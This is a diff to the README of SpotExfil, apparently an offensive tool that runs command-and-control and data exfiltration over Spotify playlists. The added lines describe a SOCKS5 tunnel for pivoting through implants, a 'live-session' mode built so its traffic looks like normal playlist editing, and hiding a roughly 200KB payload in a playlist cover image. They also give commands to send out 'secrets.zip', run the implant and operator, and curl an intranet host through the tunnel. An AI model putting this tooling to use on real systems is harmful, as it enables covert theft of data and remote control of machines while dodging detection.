@@ -39,11 +39,14 @@ More info at [Exfiltration Series: SpotExfil](https://medium.com/@jeanmichel.amb
 - **Multi-agent support** -- `agents`, `attach <id>`, `detach` for managing multiple implants
 - **Interactive shell** (`ishell`) -- remote shell with command queuing, auto-detects bash/powershell
 - **Direct shell on attach** -- type commands directly when attached (no `shell` prefix needed)
+- **SOCKS5 tunnel** (`tunnel [port]`) -- pivot through the implant: local SOCKS5 proxy multiplexed over the C2 channel, reach hosts only the target can see
+- **Live-session mode** (`--live`) -- edit-in-place session playlists: 1 API call per message instead of 2, direct-GET polling, traffic that looks like normal playlist editing
 - **Auto check-in** -- implants announce themselves, operator sees connections in real-time
 - **Modules**: shell (exec commands), exfil (read files), push (write files to target), screenshot (screen capture), sysinfo (OS/network recon)
 - **Smart rate limiting** -- exponential backoff, human-readable error messages, auto-recovery
 - **Parallel uploads** -- bounded worker pool (4 workers) with per-chunk retries, ~4x faster large sends
 - **Cached cover traffic** -- filler-track artist lookup resolved once per process, not per playlist
+- **Cover-image channel** (`send --cover`) -- hide a whole payload (~200KB) in ONE playlist cover image instead of thousands of descriptions
 
 ### Infrastructure
 - **Standalone binary** -- no runtime needed, static Go build
@@ -335,6 +338,7 @@ Commands (when attached, type directly or use prefix):
   exfil <path>    Exfiltrate a file
   push <l> <r>    Push local file <l> to remote path <r>
   screenshot [n]  Capture the target's screen (saved as JPEG locally)
+  tunnel [port]   SOCKS5 proxy via the implant (default 127.0.0.1:1080)
   sysinfo         Gather system info
 
 History:
@@ -360,8 +364,34 @@ Other:
 # Receive and decrypt
 ./spotexfil-darwin-arm64 receive -k "passphrase" -o output.txt
 
+# Cover-image channel: ONE playlist cover instead of thousands of
+# descriptions (~200KB capacity; fails cleanly if Spotify re-encodes)
+./spotexfil-darwin-arm64 send -f secrets.zip -k "passphrase" --cover
+./spotexfil-darwin-arm64 receive -k "passphrase" --cover -o secrets.zip
+
 # Clean up
 ./spotexfil-darwin-arm64 clean
+```
+
+### Live-Session Mode
+
+```bash
+# Both sides opt in with --live: one long-lived session playlist per
+# direction, edited in place. 1 API call per message, direct-GET polls,
+# and no create/delete burst signature. Falls back to classic mode
+# automatically if the session playlist is lost.
+./spotexfil-darwin-arm64 c2-implant --live --key-file /tmp/k
+./spotexfil-darwin-arm64 c2-operator -k "$(cat /tmp/k)" --live
+```
+
+### SOCKS5 Tunnel
+
+```
+[15:40] Kepler@target.local > tunnel 1080
+[*] SOCKS5 tunnel listening on 127.0.0.1:1080 (via Kepler)
+
+# In another terminal — reach hosts only the implant can see:
+curl --socks5 127.0.0.1:1080 http://intranet.target.corp/
 ```
 
 ## Security Model
@@ -481,4 +511,4 @@ This is a **proof-of-concept for educational and authorized security research pu
 - Account rotation support
 - Additional C2 modules (persistence, clipboard)
 - Multi-account relay / dead drops
-- Steganographic payload encoding
+- DCT-domain steganography (survives Spotify cover re-encoding)
